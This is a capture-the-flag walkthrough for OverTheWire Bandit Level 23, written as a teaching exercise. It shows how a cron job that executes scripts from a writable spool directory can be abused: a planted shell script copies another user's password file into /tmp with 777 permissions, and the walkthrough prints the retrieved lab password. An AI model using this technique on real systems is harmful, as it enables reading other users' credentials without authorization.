### Level 23

Level Goal

A program is running automatically at regular intervals from cron,
the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see w
hat command is being executed.

NOTE: This level requires you to create your own first shell-script. 
This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed,
so you may want to keep a copy around…
Commands you may need to solve this level

cron, crontab, crontab(5) (use “man 5 crontab” to access this)




We are initially required to look into the /etc/cron.d file and we find a file 
called cronjob_bandit24.sh which we are interested in and can cat it look at its functionality

```
$ cd /etc/cron.d/

$ ls 
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
```


```
$ cat cronjob_bandit24

@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

```
$ cat /usr/bin/cronjob_bandit24.sh

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

A line in the program specifies that it is exectuing and deleting all the 
scripts from /var/spool/$myname.

We can take a look into the directory and access Permission is Denied.


To execute and find the password we create a temp directory 

```
$ cd /tmp/
$ mkdir hs
$ cd hs

$ nano test.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/hs/pass

$ chmod 777 test.sh      # provide read,write and execute permisisons
```

Create a pass file and give it 777 permisisions

```
$ touch pass
$ chmod 777 pass
$ cp test.sh /var/spool/bandit24/  # move our test file to the spool directory to execute
```

We need to wait for the 1min timeout to complete and then cat the pass file which will contain the password to the next level.

```
bandit23@bandit:/tmp/hs$ cat pass

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

```


